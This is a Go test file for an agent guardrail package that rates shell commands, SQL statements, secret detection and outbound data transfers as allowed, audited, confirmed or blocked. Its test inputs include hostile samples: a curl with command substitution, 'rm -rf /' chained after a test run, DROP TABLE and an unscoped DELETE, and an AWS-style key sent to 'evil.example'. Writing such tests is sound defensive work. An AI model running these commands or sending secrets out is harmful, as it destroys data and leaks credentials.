package agentguard

import (
	"strings"
	"testing"

	"github.com/yangjiyj/aiguard/packages/shared-go/protection"
)

func testAWSAccessKeyID() string {
	return "AKIA" + "IOSFODNN7EXAMPLE"
}

func TestAnalyzeCommandAllowsNoShellArgvAllowlist(t *testing.T) {
	decision := AnalyzeCommand(CommandInvocation{
		Executable: "go",
		Args:       []string{"test", "./..."},
		Allowlist: []CommandAllowRule{
			{Executable: "go", ArgsPrefix: []string{"test"}},
		},
	})

	if decision.RawDecision != DecisionAllow {
		t.Fatalf("expected go test argv to be allowed, got %#v", decision)
	}
}

func TestAnalyzeCommandTreatsOrdinaryShellCompositionAsAuditSignal(t *testing.T) {
	decision := AnalyzeCommand(CommandInvocation{
		Command: "go test ./... | tee test-results.log",
		Allowlist: []CommandAllowRule{
			{Executable: "go", ArgsPrefix: []string{"test"}},
		},
	})

	if decision.RawDecision != DecisionAudit || decision.RiskLevel != "low" {
		t.Fatalf("ordinary shell composition should be observed, got %#v", decision)
	}
}

func TestAnalyzeCommandDoesNotBlockOrdinaryChainedCommands(t *testing.T) {
	decision := AnalyzeCommand(CommandInvocation{
		Executable: "go",
		Args:       []string{"test", "./...", "&&", "go", "vet", "./..."},
		Allowlist: []CommandAllowRule{
			{Executable: "go", ArgsPrefix: []string{"test"}},
		},
	})
	if decision.RawDecision != DecisionAudit || decision.RiskLevel != "low" {
		t.Fatalf("ordinary chained commands should be observed, got %#v", decision)
	}
}

func TestAnalyzeCommandTreatsShellInterpreterAsAuditSignal(t *testing.T) {
	decision := AnalyzeCommand(CommandInvocation{
		Executable: "sh",
		Args:       []string{"-c", "go test ./..."},
	})

	if decision.RawDecision != DecisionAudit || decision.RiskLevel != "low" {
		t.Fatalf("shell interpreter should be observed, got %#v", decision)
	}
}

func TestAnalyzeCommandRequiresConfirmationForCommandSubstitution(t *testing.T) {
	decision := AnalyzeCommand(CommandInvocation{Command: "curl https://example.com/$(whoami)"})

	if decision.RawDecision != DecisionConfirm || decision.RiskLevel != "high" {
		t.Fatalf("command substitution should require confirmation, got %#v", decision)
	}
}

func TestAnalyzeCommandRequiresConfirmationForDestructiveCommand(t *testing.T) {
	decision := AnalyzeCommand(CommandInvocation{Command: "go test ./...; rm -rf /"})

	if decision.RawDecision != DecisionConfirm || decision.RiskLevel != "high" {
		t.Fatalf("destructive command should require confirmation, got %#v", decision)
	}
}

func TestAnalyzeSQLAllowsSelect(t *testing.T) {
	decision := AnalyzeSQL("SELECT id, name FROM users WHERE id = 1")

	if decision.RawDecision != DecisionAllow {
		t.Fatalf("select should be allowed, got %#v", decision)
	}
}

func TestAnalyzeSQLBlocksDestructiveDDL(t *testing.T) {
	decision := AnalyzeSQL("/* migration */ DROP TABLE api_keys")

	if decision.Reason != "blocked_destructive_sql" {
		t.Fatalf("unexpected reason: %q", decision.Reason)
	}
}

func TestAnalyzeSQLBlocksMutationWithoutWhere(t *testing.T) {
	decision := AnalyzeSQL("DELETE FROM request_logs")
	if decision.RawDecision != DecisionBlock {
		t.Fatalf("mutation without where should block, got %#v", decision)
	}
}

func TestAnalyzeSQLConfirmsScopedMutation(t *testing.T) {
	decision := AnalyzeSQL("UPDATE users SET disabled = true WHERE id = 42")

	if decision.RawDecision != DecisionConfirm {
		t.Fatalf("scoped mutation should require confirm, got %#v", decision)
	}
}

func TestDetectHighConfidenceSecretsMasksEvidence(t *testing.T) {
	secret := testAWSAccessKeyID()
	findings := DetectHighConfidenceSecrets("aws_access_key_id=" + secret)

	if len(findings) != 1 {
		t.Fatalf("expected one secret finding, got %#v", findings)
	}
	if findings[0].Kind != "aws_access_key_id" {
		t.Fatalf("unexpected finding kind: %#v", findings[0])
	}
	if strings.Contains(findings[0].Evidence.MaskedPreview, secret) || strings.Contains(findings[0].Evidence.Hash, secret) {
		t.Fatalf("secret leaked in evidence: %#v", findings[0].Evidence)
	}
}

func TestAnalyzeDataEgressBlocksSecretToNonWhitelistedDomain(t *testing.T) {
	decision := AnalyzeDataEgress(DataEgressInput{
		Target:         "https://evil.example/upload",
		Body:           "token=" + testAWSAccessKeyID(),
		AllowedDomains: []string{"api.example.com"},
	})

	// 2.9.22：分析器只记防护项 agent.secret_egress 的命中；配成阻断时才拦。
	if decision.RawDecision != DecisionAudit || len(decision.ProtectionHits) != 1 {
		t.Fatalf("secret egress should be a protection-item hit, got %#v", decision)
	}
	if decision.Reason != "high_confidence_secret_egress" {
		t.Fatalf("unexpected reason: %q", decision.Reason)
	}
	if blocked := resolveProtectionHits(decision, &EffectivePolicy{Protections: blockingProtections(protection.GroupAgentTarget)}); blocked.RawDecision != DecisionBlock {
		t.Fatalf("secret egress should block when configured, got %#v", blocked)
	}
	if len(decision.Evidence) == 0 {
		t.Fatal("expected sanitized evidence")
	}
}

func TestAnalyzeDataEgressAllowsWhitelistedDomain(t *testing.T) {
	decision := AnalyzeDataEgress(DataEgressInput{
		Target:         "https://api.example.com/upload",
		Body:           "token=" + testAWSAccessKeyID(),
		AllowedDomains: []string{"api.example.com"},
	})

	if decision.RawDecision != DecisionAllow {
		t.Fatalf("whitelisted domain should allow even with high-confidence secret, got %#v", decision)
	}
}
